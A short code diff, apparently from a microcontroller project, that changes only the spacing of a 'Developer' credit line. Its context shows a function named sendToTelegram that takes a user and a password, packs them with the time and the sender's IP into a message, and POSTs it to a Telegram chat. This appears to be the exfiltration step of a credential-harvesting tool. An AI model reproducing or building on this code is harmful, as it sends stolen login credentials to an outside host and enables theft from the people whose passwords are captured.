@@ -42,7 +42,7 @@ void sendToTelegram(String user, String pass) {
                          "<b>⏱ Time:</b> <i>" + timeNow + "</i>\n"
                          "<b>🌐 IP:</b> <code>" + senderIP + "</code>\n"
                          "<b>🐉</b> <b>⊚-----------------------------------⊚ 🐉</b>\n"
-                         "<b>👨‍💻 Developer: </b> <i>MD.NAHIDUL ISLAM</i>\n";
+                         "<b>👨‍💻 Developer : </b> <i>MD.NAHIDUL ISLAM</i>\n";
 
     String payload = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + fullMessage + "\",\"parse_mode\":\"HTML\"}";
     int code = https.POST(payload);
